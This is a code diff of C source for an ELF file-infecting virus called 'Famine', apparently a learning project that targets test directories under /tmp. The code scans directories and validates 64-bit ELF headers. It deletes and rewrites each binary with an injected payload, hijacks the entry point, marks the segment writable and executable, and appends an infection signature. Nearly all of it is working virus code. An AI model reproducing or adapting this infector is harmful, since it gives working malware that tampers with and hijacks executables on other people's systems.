@@ -21,6 +21,7 @@
 #include <fcntl.h>
 #include <stdio.h>
 
+#define READ		0
 #define WRITE		1
 #define OPEN		2
 #define CLOSE		3
@@ -34,6 +35,7 @@
 
 void			find_files(char *dir);
 void			get_dat_elf(char *dir, char *file);
+int				check_dat_elf(size_t size, char *map);
 void			pack_dat_elf(char *path, int size, char *data);
 int				dat_elf_is_infected(char *data, int size);
 void			famine64_func(void);
@@ -50,10 +52,15 @@ struct linux_dirent64 {
 
 int main()
 {
-	char	*direct[] = { "/tmp/test/", "/tmp/test2/" };
+	char	*direct[] = { "/tmp/test/", "/tmp/test2/", NULL };
+	size_t	i;
 
-	find_files(direct[0]);
-	find_files(direct[1]);
+	i = 0;
+	while (direct[i])
+	{
+		find_files(direct[i]);
+		i++;
+	}
 	return 0;
 }
 
@@ -63,7 +70,7 @@ void	find_files(char *dir)
 	char	buff[1024];
 	int		ret;
 	int		off;
-	
+
 	fd = syscall(OPEN, dir, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC, 0);
 	if (fd == -1)
 		return ;
@@ -84,11 +91,13 @@ void	find_files(char *dir)
 void	get_dat_elf(char *dir, char *file)
 {
 	char	path[1024];
+	char	buf[1024];
 	int		fd;
 	int		size;
 	void	*data;
 	int		i;
 	int		j;
+	int		ret;
 
 	i = 0;
 	while (dir[i])
@@ -103,7 +112,7 @@ void	get_dat_elf(char *dir, char *file)
 		j++;
 	}
 	path[i + j] = '\0';
-	fd = syscall(OPEN, path, O_RDWR|O_NONBLOCK, 0);
+	fd = syscall(OPEN, path, O_RDONLY|O_NONBLOCK, 0);
 	if (fd == -1)
 		return ;
 	size = syscall(LSEEK, fd, 1, SEEK_END);
@@ -112,117 +121,159 @@ void	get_dat_elf(char *dir, char *file)
 		syscall(CLOSE, fd);
 		return ;
 	}
-
-	data = (void *)syscall(MMAP, NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
+	data = (void *)syscall(MMAP, NULL, size, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
 	if (data == MAP_FAILED)
 	{
 		syscall(CLOSE, fd);
 		return ;
 	}
+	if (syscall(LSEEK, fd, 0, SEEK_SET) < 0)
+	{
+		syscall(CLOSE, fd);
+		syscall(MUNMAP, data, size);
+		return ;
+	}
+	i = 0;
+	while ((ret = syscall(READ, fd, buf, sizeof(buf))) > 0)
+	{
+		j = 0;
+		while (j < ret)
+		{
+			((char *)data)[i + j] = buf[j];
+			j++;
+		}
+		i += j;
+	}
 	syscall(CLOSE, fd);
-	pack_dat_elf(path, size, data);
+	if (ret == 0)
+		if (check_dat_elf(size, data))
+			pack_dat_elf(path, size, data);
 	syscall(MUNMAP, data, size);
+}
+
+int				check_dat_elf(size_t size, char *map)
+{
+	Elf64_Ehdr	*file;
+
+	file = (Elf64_Ehdr *)map;
+	if (size < sizeof(Elf64_Ehdr))
+		return (0);
+	/* Check header integrity */
+	if (file->e_ident[0] != 0x7f || file->e_ident[1] != 'E' || file->e_ident[2] != 'L' || file->e_ident[3] != 'F'
+	|| file->e_ident[EI_CLASS] != ELFCLASS64
+	|| file->e_ident[EI_DATA] == ELFDATANONE
+	|| file->e_ident[EI_VERSION] != EV_CURRENT
+	|| (file->e_type != ET_EXEC && file->e_type != ET_DYN)
+	|| file->e_machine != EM_X86_64)
+		return (0);
+	/* Check offsets integrity */
+	if (file->e_phoff != sizeof(Elf64_Ehdr)
+	|| file->e_phoff + file->e_phnum * sizeof(Elf64_Phdr) > (Elf64_Off)size
+	|| file->e_shoff < sizeof(Elf64_Ehdr)
+	|| file->e_shoff + file->e_shnum * sizeof(Elf64_Shdr) > (Elf64_Off)size
+	|| file->e_ehsize != sizeof(Elf64_Ehdr)
+	|| file->e_phentsize != sizeof(Elf64_Phdr)
+	|| file->e_shentsize != sizeof(Elf64_Shdr)
+	|| file->e_shstrndx >= file->e_shnum)
+		return (0);
+	return (1);
 }
 
 void		pack_dat_elf(char *path, int size, char *data)
 {
-	if (data[0] == 0x7f && data[1] == 'E' && data[2] == 'L' && data[3] == 'F' &&
-		data[4] == ELFCLASS64 && data[5] != 0 && data[6] == 1 && (data[16] == 2 || data[16] == 3))
-	{
-		/* 1. Find the PT_LOAD segment who contains the entry point */
-		Elf64_Phdr *program = (Elf64_Phdr *)(data + ((Elf64_Ehdr *)data)->e_phoff);
-		Elf64_Phdr *iprogram = NULL;
-		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum && !iprogram; i++) {
-			if (program[i].p_type == PT_LOAD &&
-				program[i].p_vaddr <= ((Elf64_Ehdr *)data)->e_entry &&
-				((Elf64_Ehdr *)data)->e_entry < program[i].p_vaddr + program[i].p_filesz) {
-				iprogram = &program[i];
-			}
+	/* 1. Find the PT_LOAD segment who contains the entry point */
+	Elf64_Phdr *program = (Elf64_Phdr *)(data + ((Elf64_Ehdr *)data)->e_phoff);
+	Elf64_Phdr *iprogram = NULL;
+	for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum && !iprogram; i++) {
+		if (program[i].p_type == PT_LOAD &&
+			program[i].p_vaddr <= ((Elf64_Ehdr *)data)->e_entry &&
+			((Elf64_Ehdr *)data)->e_entry < program[i].p_vaddr + program[i].p_filesz) {
+			iprogram = &program[i];
 		}
-		if (iprogram == NULL)
-			return ;
-
-		/* 2. Check if file is already infected */
-		printf("file: %s", path);
-		if (dat_elf_is_infected(data, size)) {
-			printf(" -> Already Infected\n");
-			return ;
-		}
-
-		/* 3. Get the file permissions */
-		struct stat	stats;
-		syscall(STAT, path, &stats);
-
-		/* 4. Erase the file from system tree */
-		syscall(UNLINK, path);
-
-		/* 5. Re-open the file */
-		int fd = syscall(OPEN, path, O_WRONLY|O_CREAT|O_EXCL, stats.st_mode);
-		if (fd == -1) {
-			write(1, "OPEN file failed\n", 17);
-			return ;
-		}
-
-		/* 6. Save values usefull for later */
-		Elf64_Addr off = iprogram->p_offset + iprogram->p_filesz; // Where we write our code
-		Elf64_Addr old_entry = (off - ((Elf64_Ehdr *)data)->e_entry) * (-1);
-
-		/* 7. Change Elf Header entry point */
-		((Elf64_Ehdr *)data)->e_entry = off; // New entry point
-
-		/* 8. Check if we have room to write our code */
-		Elf64_Phdr *next_ptload = iprogram + 1; // Get the next PT_LOAD
-		if (next_ptload->p_offset - iprogram->p_offset - iprogram->p_filesz > famine64_size) {
-			iprogram->p_filesz += famine64_size;
-			iprogram->p_memsz += famine64_size;
-			iprogram->p_flags = PF_R | PF_W | PF_X;
-
-			syscall(WRITE, fd, data, off);
-			syscall(WRITE, fd, &famine64_func, famine64_size - sizeof(old_entry));
-			syscall(WRITE, fd, &old_entry, sizeof(old_entry));
-			off += famine64_size;
-			syscall(WRITE, fd, data + off, size - off - 1);
-			Elf64_Addr signature = 	0x42CAFE4224EFAC24;
-			syscall(WRITE, fd, &signature, sizeof(signature));
-			syscall(CLOSE, fd);
-		}
-		else
-		{
-			Elf64_Addr	padding = 0;
-
-			while (padding < famine64_size)
-				padding += 0x1000;
-#ifdef FAMINE_DEBUGGABLE_EXECUTABLE_OUT
-			for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
-				if (program[i].p_offset >= iprogram->p_offset + iprogram->p_filesz) {
-					program[i].p_offset += padding;
-				}
-			}
-			Elf64_Shdr *section = (Elf64_Shdr *)(data + ((Elf64_Ehdr *)data)->e_shoff);
-			for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
-				if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_filesz) {
-					section[i].sh_offset += padding;
-				}
-			}
-			((Elf64_Ehdr *)data)->e_shoff += (padding);
-#else
-			next_ptload->p_offset += padding;
-#endif
-			iprogram->p_filesz += padding;
-			iprogram->p_memsz += padding;
-			iprogram->p_flags = PF_R | PF_W | PF_X;
-			syscall(WRITE, fd, data, off);
-			syscall(WRITE, fd, &famine64_func, famine64_size - sizeof(old_entry));
-			syscall(WRITE, fd, &old_entry, sizeof(old_entry));
-			while (padding-- > famine64_size)
-				syscall(WRITE, fd, "\0", 1);
-			syscall(WRITE, fd, data + off, size - off - 1);
-			Elf64_Addr signature = 	0x42CAFE4224EFAC24;
-			syscall(WRITE, fd, &signature, sizeof(signature));
-			syscall(CLOSE, fd);
-		}
-		printf(" -> Infected\n");
 	}
+	if (iprogram == NULL)
+		return ;
+
+	/* 2. Check if file is already infected */
+	printf("file: %s", path);
+	if (dat_elf_is_infected(data, size)) {
+		printf(" -> Already Infected\n");
+		return ;
+	}
+
+	/* 3. Get the file permissions */
+	struct stat	stats;
+	syscall(STAT, path, &stats);
+
+	/* 4. Erase the file from system tree */
+	syscall(UNLINK, path);
+
+	/* 5. Re-open the file */
+	int fd = syscall(OPEN, path, O_WRONLY|O_CREAT|O_EXCL, stats.st_mode);
+	if (fd == -1) {
+		write(1, "OPEN file failed\n", 17);
+		return ;
+	}
+
+	/* 6. Save values usefull for later */
+	Elf64_Addr off = iprogram->p_offset + iprogram->p_filesz; // Where we write our code
+	Elf64_Addr old_entry = (off - ((Elf64_Ehdr *)data)->e_entry) * (-1);
+
+	/* 7. Change Elf Header entry point */
+	((Elf64_Ehdr *)data)->e_entry = off; // New entry point
+
+	/* 8. Check if we have room to write our code */
+	Elf64_Phdr *next_ptload = iprogram + 1; // Get the next PT_LOAD
+	if (next_ptload->p_offset - iprogram->p_offset - iprogram->p_filesz > famine64_size) {
+		iprogram->p_filesz += famine64_size;
+		iprogram->p_memsz += famine64_size;
+		iprogram->p_flags = PF_R | PF_W | PF_X;
+
+		syscall(WRITE, fd, data, off);
+		syscall(WRITE, fd, &famine64_func, famine64_size - sizeof(old_entry));
+		syscall(WRITE, fd, &old_entry, sizeof(old_entry));
+		off += famine64_size;
+		syscall(WRITE, fd, data + off, size - off - 1);
+		Elf64_Addr signature = 	0x42CAFE4224EFAC24;
+		syscall(WRITE, fd, &signature, sizeof(signature));
+		syscall(CLOSE, fd);
+	}
+	else
+	{
+		Elf64_Addr	padding = 0;
+
+		while (padding < famine64_size)
+			padding += 0x1000;
+#ifdef FAMINE_DEBUGGABLE_EXECUTABLE_OUT
+		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_phnum; i++) {
+			if (program[i].p_offset >= iprogram->p_offset + iprogram->p_filesz) {
+				program[i].p_offset += padding;
+			}
+		}
+		Elf64_Shdr *section = (Elf64_Shdr *)(data + ((Elf64_Ehdr *)data)->e_shoff);
+		for (size_t i = 0; i < ((Elf64_Ehdr *)data)->e_shnum; i++) {
+			if (section[i].sh_offset >= iprogram->p_offset + iprogram->p_filesz) {
+				section[i].sh_offset += padding;
+			}
+		}
+		((Elf64_Ehdr *)data)->e_shoff += (padding);
+#else
+		next_ptload->p_offset += padding;
+#endif
+		iprogram->p_filesz += padding;
+		iprogram->p_memsz += padding;
+		iprogram->p_flags = PF_R | PF_W | PF_X;
+		syscall(WRITE, fd, data, off);
+		syscall(WRITE, fd, &famine64_func, famine64_size - sizeof(old_entry));
+		syscall(WRITE, fd, &old_entry, sizeof(old_entry));
+		while (padding-- > famine64_size)
+			syscall(WRITE, fd, "\0", 1);
+		syscall(WRITE, fd, data + off, size - off - 1);
+		Elf64_Addr signature = 	0x42CAFE4224EFAC24;
+		syscall(WRITE, fd, &signature, sizeof(signature));
+		syscall(CLOSE, fd);
+	}
+	printf(" -> Infected\n");
 }
 
 int		dat_elf_is_infected(char *data, int size)
